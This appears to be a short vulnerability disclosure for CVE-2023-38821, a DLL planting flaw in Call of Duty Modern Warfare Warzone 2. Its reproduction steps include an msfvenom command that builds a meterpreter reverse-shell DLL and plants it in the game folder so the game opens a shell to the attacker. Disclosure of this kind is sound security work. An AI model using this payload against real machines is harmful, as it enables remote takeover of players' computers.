# CoD-MW-Warzone-2 - CVE-2023-38821
DLL Planting in the CoD MW Warzone 2 - CVE-2023-38821
Discoverer: Idan Malihi

# Description
An issue in Activision Call of Duty Modern Warfare: Warzone v.2 allows a local attacker to execute arbitrary code via a crafted file to the UMPDC.dll, MSIMG32.dll, RTWorkQ.DLL, WINSTA.dll, CRYPTSP.dll, dnsapi.dll, MSASN1.dll, webio.dll, fwbase.dll, ncrypt.dll, and DPAPI.DLL components.

# Steps to Reproduce
To exploit the DLL Planting vulnerability, an attacker should take the following steps:
1. Download Steam.
2. Download and Install Call of Duty Modern Warfare 2 Warzone
3. Open the installation path folder, for example, D:\STEAM\steamapps\common\Call of Duty HQ
4. Create a malicious dll file with msfvenom on Kali Linux OS:
msfvenom -p windows/x64/meterpreter/shell_reverse_tcp LHOST=IP LPORT=PORT -f dll -o RTWorkQ.DLL
5. Transfer the DLL file to the game's path D:\STEAM\steamapps\common\Call of Duty HQ
6. Play the game and get a reverse shell.
